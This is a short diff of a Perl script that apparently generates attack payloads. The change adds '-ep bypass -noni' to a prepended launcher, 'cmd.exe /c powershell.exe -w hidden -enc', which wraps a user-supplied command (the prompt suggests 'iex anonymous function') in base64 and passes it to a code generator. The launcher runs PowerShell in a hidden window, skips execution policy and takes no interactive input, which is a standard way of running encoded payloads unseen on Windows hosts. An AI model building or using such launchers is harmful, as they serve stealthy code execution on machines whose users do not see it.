@@ -464,7 +464,7 @@ sub main {
 	if ($use_encoding eq 'true' ) {
 
 		print "[!] your encoded command will prepended with the following commands\n";
-		print "[>] cmd.exe /c powershell.exe -w hidden -enc [your command to be encodede]\n";
+		print "[>] cmd.exe /c powershell.exe -ep bypass -noni -w hidden -enc [your command to be encodede]\n";
 		print "[*] enter command (iex anonymous function etc..)\n";
 
 		my $rawenc = get_cmd();
@@ -472,7 +472,7 @@ sub main {
 
 		# Passing an empty string to encode_base64 to prevent any newlines
 		my $encdcmd = encode_base64($utf16le, '');
-		my $base64cmd = 'cmd.exe /c powershell.exe -w hidden -enc' . ' ' . $encdcmd;
+		my $base64cmd = 'cmd.exe /c powershell.exe -ep bypass -noni -w hidden -enc' . ' ' . $encdcmd;
 		gen_code($base64cmd, $stype);
 
 	} else { 
